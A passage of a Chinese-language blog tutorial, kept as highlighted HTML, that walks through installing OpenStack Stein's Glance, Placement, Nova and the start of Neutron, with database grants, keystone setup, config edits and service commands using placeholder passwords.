OS_USER_DOMAIN_NAME=Default                            <span class="built_in">export</span> OS_PROJECT_NAME=admin                                  <span class="built_in">export</span> OS_USERNAME=admin                                      <span class="built_in">export</span> OS_PASSWORD=ADMIN_PASS                                 <span class="built_in">export</span> OS_AUTH_URL=http://controller:5000/v3                  <span class="built_in">export</span> OS_IDENTITY_API_VERSION=3                              <span class="built_in">export</span> OS_IMAGE_API_VERSION=2                                 EOF</span><br><span class="line"><span class="built_in">chmod</span> +x admin-openrc</span><br></pre></td></tr></table></figure><p>这个脚本的作用就是用来执行客户端命令的，直接用命令去操控openstack的keystone的时候必须定义这些，保存到文件是为了下次更快的设置自己的用户，下次执行命令的时候只需要执行<code>./admin-openrc</code>即可。这里建议验证一下服务,执行命令<code>openstack token issue</code>查看是否有回显，如果报错则说明搭建过程有问题。</p><h2 id="其他组件通用流程"><a href="#其他组件通用流程" class="headerlink" title="其他组件通用流程"></a>其他组件通用流程</h2><p>除了Keystone，其他服务搭建的流程都遵循下面步骤</p><ul><li>创库授权</li><li>keystone创建账号</li><li>keystone创建服务实体</li><li>安装服务软件包</li><li>修改服务的配置文件</li><li>同步数据库</li><li>启动服务</li><li>验证</li></ul><h2 id="Glance-镜像服务"><a href="#Glance-镜像服务" class="headerlink" title="Glance - 镜像服务"></a>Glance - 镜像服务</h2><p>此服务安装在控制节点，参考文档地址： <a href="https://docs.openstack.org/glance/stein/install/">https://docs.openstack.org/glance/stein/install/</a><br>创库授权，进入数据库节点执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">CREATE DATABASE glance;</span><br><span class="line">GRANT ALL PRIVILEGES ON glance.* TO <span class="string">&#x27;glance&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;GLANCE_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON glance.* TO <span class="string">&#x27;glance&#x27;</span>@<span class="string">&#x27;%&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;GLANCE_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在keystone中创建账号和服务实体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载环境</span></span><br><span class="line">./admin-openrc</span><br><span class="line"><span class="comment"># 创建账号</span></span><br><span class="line">openstack user create --domain default --password GLANCE_PASS glance</span><br><span class="line"><span class="comment"># 如果在之前的项目创建中已经创建过service则下面这一条可以不需要执行。</span></span><br><span class="line">openstack project create --domain default \</span><br><span class="line">  --description <span class="string">&quot;Service Project&quot;</span> service</span><br><span class="line"><span class="comment"># 给创建的用户授权，给一个admin的角色</span></span><br><span class="line">openstack role add --project service --user glance admin</span><br><span class="line"><span class="comment"># 创建glance的访问实体</span></span><br><span class="line">openstack service create --name glance \</span><br><span class="line">  --description <span class="string">&quot;OpenStack Image&quot;</span> image</span><br><span class="line"><span class="comment"># 为实体创建api访问入口</span></span><br><span class="line"><span class="comment"># 公共的</span></span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  image public http://controller:9292</span><br><span class="line"><span class="comment"># 组件之间的</span></span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  image internal http://controller:9292</span><br><span class="line"><span class="comment"># 管理员的</span></span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  image admin http://controller:9292</span><br></pre></td></tr></table></figure><p>下面在控制节点开始安装glance的软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-glance</span><br></pre></td></tr></table></figure><p>下面开始修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/glance/glance-api.conf&#123;,.bak&#125;</span><br><span class="line"><span class="built_in">cp</span> /etc/glance/glance-registry.conf&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/glance/glance-api.conf.bak &gt; /etc/glance/glance-api.conf</span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/glance/glance-registry.conf.bak &gt; /etc/glance/glance-registry.conf</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/glance/glance-api.conf</code>修改以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># database 段中添加下面内容</span><br><span class="line">connection = mysql+pymysql://glance:GLANCE_DBPASS@controller/glance</span><br><span class="line"># keystone_authtoken 段中添加下面内容</span><br><span class="line">www_authenticate_uri  = http://controller:5000</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = Default</span><br><span class="line">user_domain_name = Default</span><br><span class="line">project_name = service</span><br><span class="line">username = glance</span><br><span class="line">password = GLANCE_PASS</span><br><span class="line"># paste_deploy 段中添加下面内容</span><br><span class="line">flavor = keystone</span><br><span class="line"># glance_store 段中添加下面内容</span><br><span class="line">stores = file,http</span><br><span class="line">default_store = file</span><br><span class="line">filesystem_store_datadir = /var/lib/glance/images/</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/glance/glance-registry.conf</code>修改以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># database 段中添加下面内容</span><br><span class="line">connection = mysql+pymysql://glance:GLANCE_DBPASS@controller/glance</span><br><span class="line"># keystone_authtoken 段中添加下面内容</span><br><span class="line">www_authenticate_uri = http://controller:5000</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = Default</span><br><span class="line">user_domain_name = Default</span><br><span class="line">project_name = service</span><br><span class="line">username = glance</span><br><span class="line">password = GLANCE_PASS</span><br><span class="line"># paste_deploy 段中添加下面内容</span><br><span class="line">flavor = keystone</span><br></pre></td></tr></table></figure><p>以glance的身份填充数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">&quot;glance-manage db_sync&quot;</span> glance</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now openstack-glance-api.service \</span><br><span class="line">  openstack-glance-registry.service</span><br></pre></td></tr></table></figure><p>验证组件参考： <a href="https://docs.openstack.org/glance/stein/install/verify.html">https://docs.openstack.org/glance/stein/install/verify.html</a></p><h2 id="Placemen-计算安置服务"><a href="#Placemen-计算安置服务" class="headerlink" title="Placemen - 计算安置服务"></a>Placemen - 计算安置服务</h2><p>此服务安装在控制节点，文档参考地址： <a href="https://docs.openstack.org/placement/stein/install/">https://docs.openstack.org/placement/stein/install/</a><br>先是授权，到数据库节点执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">CREATE DATABASE placement;</span><br><span class="line">GRANT ALL PRIVILEGES ON placement.* TO <span class="string">&#x27;placement&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;PLACEMENT_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON placement.* TO <span class="string">&#x27;placement&#x27;</span>@<span class="string">&#x27;%&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;PLACEMENT_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在keystone中创建账号和服务实体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载环境</span></span><br><span class="line">./admin-openrc</span><br><span class="line"><span class="comment"># 创建用户</span></span><br><span class="line">openstack user create --domain default --password PLACEMENT_PASS placement</span><br><span class="line"><span class="comment"># 关联权限</span></span><br><span class="line">openstack role add --project service --user placement admin</span><br><span class="line"><span class="comment"># 创建实体</span></span><br><span class="line">openstack service create --name placement \</span><br><span class="line">  --description <span class="string">&quot;Placement API&quot;</span> placement</span><br><span class="line"><span class="comment"># 开放入口</span></span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  placement public http://controller:8778</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  placement internal http://controller:8778</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  placement admin http://controller:8778</span><br></pre></td></tr></table></figure><p>安装软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-placement-api</span><br></pre></td></tr></table></figure><p>下面开始修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/placement/placement.conf&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/placement/placement.conf.bak &gt; /etc/placement/placement.conf</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/placement/placement.conf</code>修改以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># placement_database 段</span></span><br><span class="line">connection = mysql+pymysql://placement:PLACEMENT_DBPASS@controller/placement</span><br><span class="line"><span class="comment"># api 段</span></span><br><span class="line">auth_strategy = keystone</span><br><span class="line"><span class="comment"># keystone_authtoken 段</span></span><br><span class="line">auth_url = http://controller:5000/v3</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = Default</span><br><span class="line">user_domain_name = Default</span><br><span class="line">project_name = service</span><br><span class="line">username = placement</span><br><span class="line">password = PLACEMENT_PASS</span><br></pre></td></tr></table></figure><p>以placement的身份填充数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">&quot;placement-manage db sync&quot;</span> placement</span><br></pre></td></tr></table></figure><p>重启http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><p>验证参考组件参考： <a href="https://docs.openstack.org/placement/stein/install/verify.html">https://docs.openstack.org/placement/stein/install/verify.html</a></p><h2 id="Nova-计算控制节点"><a href="#Nova-计算控制节点" class="headerlink" title="Nova - 计算控制节点"></a>Nova - 计算控制节点</h2><p>此服务安装在控制节点，参考文档地址： </p><ul><li><a href="https://docs.openstack.org/nova/stein/install/">https://docs.openstack.org/nova/stein/install/</a></li><li><a href="https://docs.openstack.org/nova/stein/install/controller-install-rdo.html">https://docs.openstack.org/nova/stein/install/controller-install-rdo.html</a><br>先是建库和授权，到数据库节点执行下面命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">CREATE DATABASE nova_api;</span><br><span class="line">CREATE DATABASE nova;</span><br><span class="line">CREATE DATABASE nova_cell0;</span><br><span class="line">GRANT ALL PRIVILEGES ON nova_api.* TO <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON nova_api.* TO <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;%&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON nova.* TO <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON nova.* TO <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;%&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON nova_cell0.* TO <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON nova_cell0.* TO <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;%&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在keystone中创建账号和服务实体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 凭证环境</span></span><br><span class="line">./admin-openrc</span><br><span class="line"><span class="comment"># 创建用户</span></span><br><span class="line">openstack user create --domain default --password NOVA_PASS nova</span><br><span class="line"><span class="comment"># 关联权限</span></span><br><span class="line">openstack role add --project service --user nova admin</span><br><span class="line"><span class="comment"># 创建访问实例</span></span><br><span class="line">openstack service create --name nova \</span><br><span class="line">  --description <span class="string">&quot;OpenStack Compute&quot;</span> compute</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  compute public http://controller:8774/v2.1</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  compute internal http://controller:8774/v2.1</span><br><span class="line">openstack endpoint create --region RegionOne \</span><br><span class="line">  compute admin http://controller:8774/v2.1</span><br></pre></td></tr></table></figure><p>安装软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-nova-api openstack-nova-conductor \</span><br><span class="line">  openstack-nova-novncproxy openstack-nova-scheduler</span><br></pre></td></tr></table></figure><p>关于三个包的作用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openstack-nova-api 组件之间调用</span><br><span class="line">openstack-nova-conductor 用来协调数据库的，后期计算节点会很多，如果每个都有数据库信息这样并不安全而且也很麻烦，所以这个组件就负责计算节点之前数据库和各类调用与数据库交互用的。</span><br><span class="line">openstack-nova-novncproxy 创建好的机器会开放VNC，这个就是用来提供一个VNC连接的</span><br><span class="line">openstack-nova-scheduler 用来协调资源的，一个实例请求发送过来之后，他来判断那台主机适合创建这台机器。</span><br></pre></td></tr></table></figure><p>下面开始修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/nova/nova.conf&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/nova/nova.conf.bak &gt; /etc/nova/nova.conf</span><br></pre></td></tr></table></figure><p>编辑配置<code>/etc/nova/nova.conf</code>，主要修改下面内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]                                                        </span><br><span class="line">my_ip = 10.0.0.11                                                </span><br><span class="line">enabled_apis = osapi_compute,metadata                            </span><br><span class="line">transport_url = rabbit://openstack:RABBIT_PASS@controller        </span><br><span class="line">use_neutron = <span class="literal">true</span>                                               </span><br><span class="line">firewall_driver = nova.virt.firewall.NoopFirewallDriver</span><br><span class="line">[api]                   </span><br><span class="line">auth_strategy = keystone</span><br><span class="line">[api_database]                                                   </span><br><span class="line">connection = mysql+pymysql://nova:NOVA_DBPASS@controller/nova_api</span><br><span class="line">[database]                                                                         connection = mysql+pymysql://nova:NOVA_DBPASS@controller/nova</span><br><span class="line">[glance]</span><br><span class="line">api_servers = http://controller:9292</span><br><span class="line">[keystone_authtoken]                                                               auth_url = http://controller:5000/v3                                               memcached_servers = controller:11211                                               auth_type = password                                                               project_domain_name = Default                                                      user_domain_name = Default                                                         project_name = service                                                             username = nova                                                                    password = NOVA_PASS</span><br><span class="line">[oslo_concurrency]                                               </span><br><span class="line">lock_path = /var/lib/nova/tmp</span><br><span class="line">[placement]                                                                        region_name = RegionOne                                                            project_domain_name = Default                                                      project_name = service                                                             auth_type = password                                                               user_domain_name = Default                                                         auth_url = http://controller:5000/v3                                               username = placement     </span><br><span class="line">password = PLACEMENT_PASS</span><br><span class="line">[vnc]                              </span><br><span class="line">enabled = <span class="literal">true</span>                     </span><br><span class="line">server_listen = <span class="variable">$my_ip</span>             </span><br><span class="line">server_proxyclient_address = <span class="variable">$my_ip</span></span><br></pre></td></tr></table></figure><p>根据对应段进行添加配置，其中需要注意的是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">use_neutron = <span class="literal">true</span></span><br><span class="line">firewall_driver = nova.virt.firewall.NoopFirewallDriver</span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure><p>这段中，在老版本的环境中，网络还不是<code>neutron</code>组件来管的，是nova的一个，他为了兼容添加了<code>use_neutron</code>这个参数，需要打开<br>下面开始填充数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">&quot;nova-manage api_db sync&quot;</span> nova</span><br><span class="line">su -s /bin/sh -c <span class="string">&quot;nova-manage cell_v2 map_cell0&quot;</span> nova</span><br><span class="line">su -s /bin/sh -c <span class="string">&quot;nova-manage cell_v2 create_cell --name=cell1 --verbose&quot;</span> nova</span><br><span class="line">su -s /bin/sh -c <span class="string">&quot;nova-manage db sync&quot;</span> nova</span><br><span class="line">su -s /bin/sh -c <span class="string">&quot;nova-manage cell_v2 list_cells&quot;</span> nova</span><br></pre></td></tr></table></figure><p>在执行过程中可能有一条会出现几条警告，那个无所谓别出现报错就行。<br>启动服务，启动服务的命令和官网文档的稍微不一样，这里移除了<code>openstack-nova-consoleauth</code>，这个服务在18.0.0 (Rocky)的时候就被遗弃了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now openstack-nova-api.service \</span><br><span class="line">  openstack-nova-scheduler.service \</span><br><span class="line">  openstack-nova-conductor.service openstack-nova-novncproxy.service</span><br></pre></td></tr></table></figure><p>配置好之后验证好可以参考链接： <a href="https://docs.openstack.org/nova/stein/install/verify.html">https://docs.openstack.org/nova/stein/install/verify.html</a><br>按照本文的进度搭建好的service组件应该是只有两个<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020241230150545.png"><br>这是正常的，然后通过<code>nova-status upgrade check</code>去验证的时候会出现403的错误，这也是正常的，因为这是个bug，具体可参考文章： <a href="https://www.cnblogs.com/omgasw/p/12016839.html">https://www.cnblogs.com/omgasw/p/12016839.html</a><br>解决方案是编辑<code>/etc/httpd/conf.d/00-placement-api.conf</code>，添加配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /usr/bin&gt;</span><br><span class="line">   &lt;IfVersion &gt;= 2.4&gt;</span><br><span class="line">      Require all granted</span><br><span class="line">   &lt;/IfVersion&gt;</span><br><span class="line">   &lt;IfVersion &lt; 2.4&gt;</span><br><span class="line">      Order allow,deny</span><br><span class="line">      Allow from all</span><br><span class="line">   &lt;/IfVersion&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>之后重启apache服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure><p>即可再次尝试通过<code>nova-status upgrade check</code>去验证。</p><h2 id="Nova-计算节点"><a href="#Nova-计算节点" class="headerlink" title="Nova - 计算节点"></a>Nova - 计算节点</h2><p>下面的操作是在计算节点中操作，文档参考： <a href="https://docs.openstack.org/nova/stein/install/compute-install-rdo.html">https://docs.openstack.org/nova/stein/install/compute-install-rdo.html</a><br>下面开始安装组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-nova-compute</span><br></pre></td></tr></table></figure><p>下面开始修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/nova/nova.conf&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/nova/nova.conf.bak &gt; /etc/nova/nova.conf</span><br></pre></td></tr></table></figure><p>编辑配置<code>/etc/nova/nova.conf</code>，主要修改下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]                                                </span><br><span class="line">my_ip = 10.0.0.31                                        </span><br><span class="line">use_neutron = true                                       </span><br><span class="line">firewall_driver = nova.virt.firewall.NoopFirewallDriver  </span><br><span class="line">enabled_apis = osapi_compute,metadata                    </span><br><span class="line">transport_url = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line">[api]</span><br><span class="line">auth_strategy = keystone</span><br><span class="line">[glance]                            </span><br><span class="line">api_servers = http://controller:9292</span><br><span class="line">[keystone_authtoken]                                                               auth_url = http://controller:5000/v3                                               memcached_servers = controller:11211                                               auth_type = password                                                               project_domain_name = Default                                                      user_domain_name = Default                                                         project_name = service                                                             username = nova     </span><br><span class="line">password = NOVA_PASS</span><br><span class="line">[oslo_concurrency]           </span><br><span class="line">lock_path = /var/lib/nova/tmp</span><br><span class="line">[placement]                                                                        region_name = RegionOne                                                            project_domain_name = Default                                                      project_name = service                                                             auth_type = password                                                               user_domain_name = Default                                                         auth_url = http://controller:5000/v3                                               username = placement     </span><br><span class="line">password = PLACEMENT_PASS</span><br><span class="line">[vnc]                                                                              enabled = true                                                                     server_listen = 0.0.0.0                                                            server_proxyclient_address = $my_ip                       </span><br><span class="line">novncproxy_base_url = http://controller:6080/vnc_auto.html</span><br></pre></td></tr></table></figure><p>要注意的是<code>my_ip</code>这里需要改成自己的ip。<br>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now libvirtd.service openstack-nova-compute.service</span><br></pre></td></tr></table></figure><p>然后验证参考链接： <a href="https://docs.openstack.org/nova/stein/install/compute-install-rdo.html#add-the-compute-node-to-the-cell-database">https://docs.openstack.org/nova/stein/install/compute-install-rdo.html#add-the-compute-node-to-the-cell-database</a><br>每次加计算节点的时候都需要在控制节点执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">&quot;nova-manage cell_v2 discover_hosts --verbose&quot;</span> nova</span><br></pre></td></tr></table></figure><p>这是用来发现主机的，如果不想手动去执行，则可以在nova的控制节点配置中添加这段配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[scheduler]</span><br><span class="line">discover_hosts_in_cells_interval = 300</span><br></pre></td></tr></table></figure><h2 id="Neutron-网络控制节点"><a href="#Neutron-网络控制节点" class="headerlink" title="Neutron - 网络控制节点"></a>Neutron - 网络控制节点</h2><p>参考文档如下</p><ul><li><a href="https://docs.openstack.org/neutron/stein/install/install-rdo.html">https://docs.openstack.org/neutron/stein/install/install-rdo.html</a></li><li><a href="https://docs.openstack.org/neutron/stein/install/controller-install-rdo.html">https://docs.openstack.org/neutron/stein/install/controller-install-rdo.html</a></li><li><a href="https://docs.openstack.org/neutron/stein/install/controller-install-option1-rdo.html">https://docs.openstack.org/neutron/stein/install/controller-install-option1-rdo.html</a><br>先在数据库节点去创建对应的库和授权</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">CREATE DATABASE neutron;</span><br><span class="line">GRANT ALL PRIVILEGES ON neutron.* TO <span class="string">&#x27;neutron&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> \</span><br><span class="line">  IDENTIFIED BY <span class="string">&#x27;NEUTRON_DBPASS&#x27;</span>;</span><br><span class="line">GRANT ALL PRIVILEGES ON neutron.* TO <span 